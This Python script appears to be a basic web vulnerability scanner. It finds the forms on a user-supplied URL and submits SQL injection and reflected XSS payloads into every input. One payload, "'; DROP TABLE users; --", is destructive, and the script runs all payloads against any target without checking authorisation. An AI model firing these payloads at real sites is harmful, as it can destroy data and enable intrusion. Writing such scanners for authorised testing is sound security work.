import requests
from bs4 import BeautifulSoup
import urllib.parse

# Function to extract forms from a webpage
def get_forms(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except Exception as e:
        print(f"Error fetching forms from {url}: {e}")
        return []

# Function to submit a form with a payload
def submit_form(form, url, payload):
    action = form.get('action')
    method = form.get('method', 'get').lower()
    inputs = form.find_all('input')
    
    # Build data dictionary from inputs
    data = {}
    for input_tag in inputs:
        name = input_tag.get('name')
        if name:
            data[name] = payload  # Inject payload into all inputs
    
    # Construct full action URL
    action_url = urllib.parse.urljoin(url, action) if action else url
    
    try:
        if method == 'post':
            response = requests.post(action_url, data=data, timeout=10)
        else:
            response = requests.get(action_url, params=data, timeout=10)
        return response
    except Exception as e:
        print(f"Error submitting form: {e}")
        return None

# Function to test for SQL Injection
def test_sqli(url, form):
    payloads = ["' OR 1=1 --", "' OR '1'='1", "'; DROP TABLE users; --"]
    for payload in payloads:
        response = submit_form(form, url, payload)
        if response and ('error' in response.text.lower() or 'sql' in response.text.lower() or 'syntax' in response.text.lower()):
            return True  # Potential SQLi detected
    return False

# Function to test for XSS
def test_xss(url, form):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>"]
    for payload in payloads:
        response = submit_form(form, url, payload)
        if response and payload in response.text:
            return True  # Potential XSS detected (reflected)
    return False

# Main scanning function
def scan_url(url):
    print(f"Scanning {url} for vulnerabilities...")
    forms = get_forms(url)
    if not forms:
        print("No forms found.")
        return
    
    for i, form in enumerate(forms):
        print(f"\nTesting form {i+1}: {form.get('action', 'No action')}")
        
        if test_sqli(url, form):
            print("  [VULNERABILITY] Potential SQL Injection detected!")
        else:
            print("  No SQL Injection detected.")
        
        if test_xss(url, form):
            print("  [VULNERABILITY] Potential XSS detected!")
        else:
            print("  No XSS detected.")

# Entry point
if __name__ == "__main__":
    target_url = input("Enter the URL to scan (e.g., http://example.com): ").strip()
    if not target_url.startswith(('http://', 'https://')):
        print("Invalid URL. Must start with http:// or https://")
    else:
        scan_url(target_url)